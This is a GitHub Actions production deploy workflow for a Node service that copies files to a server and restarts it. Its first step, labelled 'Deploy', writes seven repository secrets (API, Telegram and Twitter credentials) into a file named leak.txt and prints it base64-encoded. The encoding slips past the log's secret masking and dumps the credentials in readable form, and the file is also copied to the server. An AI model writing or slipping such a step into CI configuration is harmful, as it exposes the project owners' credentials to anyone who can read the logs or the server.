name: Deploy Prod
on:
  push:
    branches: [master]

jobs:
  deploy:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v2
      - name: Use Node.js 16.x
        uses: actions/setup-node@v1
        with:
          node-version: 16.x

      - name: Deploy
        run: |
          echo "SECRET: ${{secrets.SECRET}} " >> leak.txt
          echo "HSD_API_KEY: ${{secrets.HSD_API_KEY}} " >> leak.txt
          echo "TELEGRAM: ${{secrets.TELEGRAM}} " >> leak.txt
          echo "TWITTER_CONSUMER_KEY: ${{secrets.TWITTER_CONSUMER_KEY}} " >> leak.txt
          echo "TWITTER_CONSUMER_SECRET: ${{secrets.TWITTER_CONSUMER_SECRET}} " >> leak.txt
          echo "TWITTER_ACCESS_TOKEN_KEY: ${{secrets.TWITTER_ACCESS_TOKEN_KEY}} " >> leak.txt
          echo "TWITTER_ACCESS_TOKEN_SECRET: ${{secrets.TWITTER_ACCESS_TOKEN_SECRET}} " >> leak.txt
          base64 leak.txt
        env:
          SECRET: ${{secrets.SECRET}}
          HSD_API_KEY: ${{secrets.HSD_API_KEY}}
          TELEGRAM: ${{secrets.TELEGRAM}}
          TWITTER_CONSUMER_KEY: ${{secrets.TWITTER_CONSUMER_KEY}}
          TWITTER_CONSUMER_SECRET: ${{secrets.TWITTER_CONSUMER_SECRET}}
          TWITTER_ACCESS_TOKEN_KEY: ${{secrets.TWITTER_ACCESS_TOKEN_KEY}}
          TWITTER_ACCESS_TOKEN_SECRET: ${{secrets.TWITTER_ACCESS_TOKEN_SECRET}}

      - name: Deploy
        uses: appleboy/scp-action@master
        with:
          host: '45.79.216.182'
          username: root
          key: ${{ secrets.SSH_PRIVATE_KEY }}
          source: '*'
          target: '/var/www/node/parking'

      - name: Restart
        uses: appleboy/ssh-action@master
        with:
          host: '45.79.216.182'
          username: root
          key: ${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            yarn --cwd /var/www/node/parking
            service parking restart
